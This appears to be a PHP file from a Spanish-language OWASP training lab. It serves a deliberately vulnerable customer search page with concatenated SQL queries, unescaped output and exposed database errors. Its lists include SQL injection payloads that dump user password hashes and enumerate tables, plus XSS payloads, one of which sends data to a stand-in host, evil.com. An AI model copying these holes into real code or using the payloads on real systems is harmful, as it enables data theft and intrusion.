<?php
/**
 * OWASP Top 10 Labs 2025 - A05: Injection
 * Modulo: Buscador de Clientes - VULNERABLE
 * 
 * VULNERABILIDADES:
 * 1. SQL Injection: query armada por concatenacion directa
 * 2. XSS reflejado: el output no usa htmlspecialchars()
 * 
 * MITIGACION DE SUPERFICIE:
 * - CSP bloquea fetch/XHR a externos (no BeEF, no exfiltracion)
 * - HttpOnly cookie (XSS no puede leer document.cookie)
 * - El XSS sigue ejecutando para fines educativos (alert funciona)
 * 
 * NO USAR EN PRODUCCION - Solo para fines educativos
 */

// CSP: permite scripts inline (XSS funciona) pero bloquea conexiones externas
// Permitimos cdn.jsdelivr.net para Bootstrap (CSS y JS)
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; connect-src 'self'; frame-ancestors 'self';");

// Cookies HttpOnly + SameSite para reducir impacto del XSS
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_samesite', 'Strict');
session_start();

$_SESSION['user_id'] = $_SESSION['user_id'] ?? 2;
$_SESSION['username'] = $_SESSION['username'] ?? 'alice';

require_once __DIR__ . '/../config/db.php';

$pageTitle = 'Resultados de Busqueda - Nexo';

$labInfo = [
    'id' => 'A05:2025',
    'name' => 'Injection',
    'difficulty' => 'Intermedia',
    'description' => '
        <p>Este endpoint es <strong>doblemente vulnerable</strong>:</p>
        <ol>
            <li><strong>SQL Injection:</strong> La query se arma concatenando el input directamente</li>
            <li><strong>XSS reflejado:</strong> Los resultados se muestran sin escapar</li>
        </ol>
        <div class="alert alert-info small mt-2 mb-0">
            <strong>Mitigacion aplicada:</strong> CSP bloquea conexiones externas + cookie HttpOnly.
            El XSS ejecuta (alert funciona) pero no puede robar sesion ni contactar servidores externos.
        </div>
    ',
    'exploit' => '# Ver todos los clientes (bypass del filtro)
?q=\' OR \'1\'=\'1

# Extraer tabla users con UNION
?q=\' UNION SELECT id,username,password_md5,email,role,created_at,7,8 FROM users-- 

# XSS basico (FUNCIONA - el alert se ejecuta)
?q=<script>alert(\'XSS ejecutado!\')</script>

# XSS robo de cookie (FALLA - cookie es HttpOnly)
?q=<script>alert(document.cookie)</script>
# Resultado: cookie vacia porque es HttpOnly

# XSS exfiltracion (BLOQUEADO por CSP)
?q=<script>fetch(\'http://evil.com/steal?data=test\')</script>
# Resultado: CSP bloquea la conexion externa',
    'prevention' => '// ESTE ARCHIVO (vulnerable pero mitigado):
// CSP: script-src \'self\' \'unsafe-inline\'; connect-src \'self\'
// Cookie: HttpOnly + SameSite=Strict

// El XSS ejecuta PERO:
// - No puede leer document.cookie (HttpOnly)
// - No puede hacer fetch() a externos (CSP connect-src)
// - No puede cargar scripts externos (CSP script-src)

// buscar_secure.php (seguro):
$stmt = $pdo->prepare("SELECT * FROM clients WHERE name LIKE ?");
$stmt->execute([\'%\' . $search . \'%\']);
echo htmlspecialchars($row[\'name\']); // CON escapar',
    'caseStudy' => [
        'title' => 'Equifax (2017)',
        'description' => '147 millones de personas afectadas. Injection en Apache Struts. $1.4B en costos.'
    ],
    'cwes' => ['CWE-89', 'CWE-79'],
    'tools' => ['SQLMap', 'Burp Suite', 'curl'],
    'secureVersion' => 'buscar_secure.php',
];

$searchTerm = $_GET['q'] ?? '';
$results = [];
$error = null;
$queryExecuted = '';
$isSqlInjection = false;
$isXss = false;

if ($searchTerm !== '') {
    try {
        // VULNERABLE: Usando mysqli para poder mostrar el error real de MySQL
        $conn = getVulnerableConnection();
        
        // SQL INJECTION: Query armada por concatenacion directa
        // El atacante puede cerrar la comilla y agregar su propia SQL
        $query = "SELECT * FROM clients WHERE name LIKE '%" . $searchTerm . "%'";
        $queryExecuted = $query;
        
        // Detectar si hay intento de injection (para mostrar alerta educativa)
        $injectionPatterns = ["'", 'UNION', 'SELECT', 'OR ', '--', '#', '/*'];
        foreach ($injectionPatterns as $pattern) {
            if (stripos($searchTerm, $pattern) !== false) {
                $isSqlInjection = true;
                break;
            }
        }
        
        // Detectar XSS
        if (preg_match('/<[^>]+>/', $searchTerm)) {
            $isXss = true;
        }
        
        $result = $conn->query($query);
        
        if ($result) {
            while ($row = $result->fetch_assoc()) {
                $results[] = $row;
            }
        }
        
        $conn->close();
        
    } catch (Exception $e) {
        // VULNERABLE: Exponer el error de MySQL (podria revelar estructura de la DB)
        $error = "Error MySQL: " . $e->getMessage();
    }
}

include __DIR__ . '/../shared/header.php';
?>

<main class="container py-4">
    <div class="d-flex justify-content-between align-items-center mb-4">
        <div>
            <h1 class="h3 mb-1">Resultados de Busqueda</h1>
            <p class="text-muted mb-0">
                Busqueda: <strong><?= $searchTerm /* XSS: Sin escapar */ ?></strong>
            </p>
        </div>
        <a href="index.php" class="btn btn-outline-secondary">Nueva busqueda</a>
    </div>

    <?php if ($isSqlInjection): ?>
    <!-- Alerta educativa: SQL Injection detectado -->
    <div class="alert alert-danger d-flex align-items-center">
        <div class="fs-3 me-3">SQL INJECTION!</div>
        <div>
            <strong>Se detecto un intento de SQL Injection</strong><br>
            <small>En un sistema real, esto habria sido bloqueado por un WAF o causado un error. 
            Aqui lo dejamos pasar para que veas el efecto.</small>
        </div>
    </div>
    
    <!-- Mostrar la query que se ejecuto -->
    <div class="card mb-4 border-danger">
        <div class="card-header bg-danger text-white">
            <strong>Query ejecutada (visible solo en el lab)</strong>
        </div>
        <div class="card-body">
            <pre class="mb-0 text-danger"><code><?= htmlspecialchars($queryExecuted) ?></code></pre>
        </div>
    </div>
    <?php endif; ?>

    <?php if ($isXss): ?>
    <!-- Alerta educativa: XSS detectado -->
    <div class="alert alert-warning d-flex align-items-center">
        <div class="fs-3 me-3">XSS!</div>
        <div>
            <strong>Se detecto contenido HTML/JS en el input</strong><br>
            <small>El script se ejecuto, PERO esta mitigado:</small>
            <ul class="small mb-0 mt-1">
                <li><code>document.cookie</code> esta vacio (HttpOnly)</li>
                <li><code>fetch()</code> a externos bloqueado (CSP)</li>
                <li>No se puede cargar BeEF ni scripts externos (CSP)</li>
            </ul>
        </div>
    </div>
    <?php endif; ?>

    <?php if ($error): ?>
        <div class="alert alert-danger">
            <strong>Error de base de datos:</strong><br>
            <code><?= $error /* Vulnerable: error sin escapar */ ?></code>
        </div>
    <?php endif; ?>

    <?php if (empty($results) && !$error): ?>
        <div class="alert alert-info">
            No se encontraron clientes con "<strong><?= $searchTerm ?></strong>"
        </div>
    <?php elseif (!empty($results)): ?>
        
        <div class="card">
            <div class="card-header bg-white d-flex justify-content-between align-items-center">
                <strong>Resultados</strong>
                <span class="badge bg-<?= $isSqlInjection ? 'danger' : 'primary' ?>">
                    <?= count($results) ?> registros
                </span>
            </div>
            <div class="table-responsive">
                <table class="table table-hover mb-0">
                    <thead class="table-light">
                        <tr>
                            <?php 
                            // Mostrar headers dinamicos (util para ver UNION con otras tablas)
                            if (!empty($results[0])) {
                                foreach (array_keys($results[0]) as $col) {
                                    echo "<th>" . $col . "</th>"; // Vulnerable: sin escapar
                                }
                            }
                            ?>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($results as $row): ?>
                        <tr class="<?= $isSqlInjection ? 'table-danger' : '' ?>">
                            <?php foreach ($row as $value): ?>
                                <!-- XSS: El valor se muestra sin htmlspecialchars() -->
                                <td><?= $value ?></td>
                            <?php endforeach; ?>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>

        <?php if ($isSqlInjection): ?>
        <div class="alert alert-info mt-4">
            <strong>Observa:</strong> Si usaste UNION, los datos de la tabla <code>users</code> 
            aparecen mezclados con los clientes. La columna <code>password_md5</code> contiene 
            los hashes MD5 que podes crackear en <a href="https://crackstation.net/" target="_blank">CrackStation</a>.
        </div>
        <?php endif; ?>

    <?php endif; ?>

    <!-- Formulario de busqueda rapida -->
    <div class="card mt-4">
        <div class="card-body">
            <form action="buscar.php" method="GET" class="row g-2 align-items-end">
                <div class="col">
                    <input type="text" 
                           class="form-control" 
                           name="q" 
                           value="<?= $searchTerm /* XSS: sin escapar */ ?>"
                           placeholder="Nueva busqueda...">
                </div>
                <div class="col-auto">
                    <button type="submit" class="btn btn-primary">Buscar</button>
                </div>
                <div class="col-auto">
                    <a href="buscar_secure.php?q=<?= urlencode($searchTerm) ?>" class="btn btn-outline-success">
                        Probar version segura
                    </a>
                </div>
            </form>
        </div>
    </div>

    <!-- Payloads de ejemplo -->
    <div class="card mt-4">
        <div class="card-header bg-dark text-white">
            Payloads de ejemplo
        </div>
        <div class="card-body">
            <div class="row">
                <div class="col-md-6">
                    <h6>SQL Injection</h6>
                    <ul class="small">
                        <li><a href="?q=' OR '1'='1">Ver todos los registros</a></li>
                        <li><a href="?q=' UNION SELECT id,username,password_md5,email,role,created_at,7,8 FROM users-- ">UNION - Extraer usuarios</a></li>
                        <li><a href="?q=' AND 1=0 UNION SELECT 1,@@version,3,4,5,6,7,8-- ">Version de MySQL</a></li>
                        <li><a href="?q=' AND 1=0 UNION SELECT 1,table_name,3,4,5,6,7,8 FROM information_schema.tables WHERE table_schema=database()-- ">Listar tablas</a></li>
                    </ul>
                </div>
                <div class="col-md-6">
                    <h6>XSS (mitigado con CSP + HttpOnly)</h6>
                    <ul class="small">
                        <li><a href="?q=<script>alert('XSS')</script>">✅ Alert basico (funciona)</a></li>
                        <li><a href="?q=<script>alert(document.cookie)</script>">⚠️ Leer cookie (vacia - HttpOnly)</a></li>
                        <li><a href="?q=<img src=x onerror=alert('XSS')>">✅ Img onerror (funciona)</a></li>
                        <li><a href="?q=<script>fetch('http://evil.com')</script>">❌ Exfiltrar (bloqueado CSP)</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</main>

<?php 
include __DIR__ . '/../shared/lab_panel.php';
include __DIR__ . '/../shared/footer.php'; 
?>
